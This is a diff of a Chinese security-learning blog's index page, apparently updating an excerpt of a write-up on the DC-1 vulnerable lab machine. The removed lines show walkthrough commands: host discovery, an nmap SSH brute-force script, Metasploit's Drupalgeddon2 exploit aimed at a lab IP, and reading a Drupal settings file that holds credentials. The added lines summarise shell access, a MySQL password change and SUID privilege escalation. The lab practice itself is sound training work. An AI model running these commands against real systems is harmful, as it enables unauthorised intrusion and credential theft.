@@ -171,7 +171,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DC-1靶场复现</a>
+            <a href="/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DC-1靶机复现</a>
         </h2>
 
         <div class="post-meta">
@@ -180,9 +180,24 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-05-30 16:45:45 / 修改时间：17:35:34" itemprop="dateCreated datePublished" datetime="2025-05-30T16:45:45+08:00">2025-05-30</time>
+              <time title="创建时间：2025-05-30 16:45:45" itemprop="dateCreated datePublished" datetime="2025-05-30T16:45:45+08:00">2025-05-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-02 10:25:36" itemprop="dateModified" datetime="2025-06-02T10:25:36+08:00">2025-06-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
             </span>
 
           
@@ -196,15 +211,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.130.137</span><br></pre></td></tr></table></figure>
-<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ssh-brute 192.168.130.137</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
-<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.130.137</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span></span><br><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/flag1.txt</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
-
+          <p> 记录一下dc靶机系列的漏洞，本次学习的是DC-1，涉及的知识包括msf利用历史漏洞获取shell，mysql数据库更改密码，suid提权</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/05/30/DC-1%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -572,7 +587,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-17 11:03:44" itemprop="dateModified" datetime="2025-05-17T11:03:44+08:00">2025-05-17</time>
+                <time title="修改时间：2025-06-02 10:25:13" itemprop="dateModified" datetime="2025-06-02T10:25:13+08:00">2025-06-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
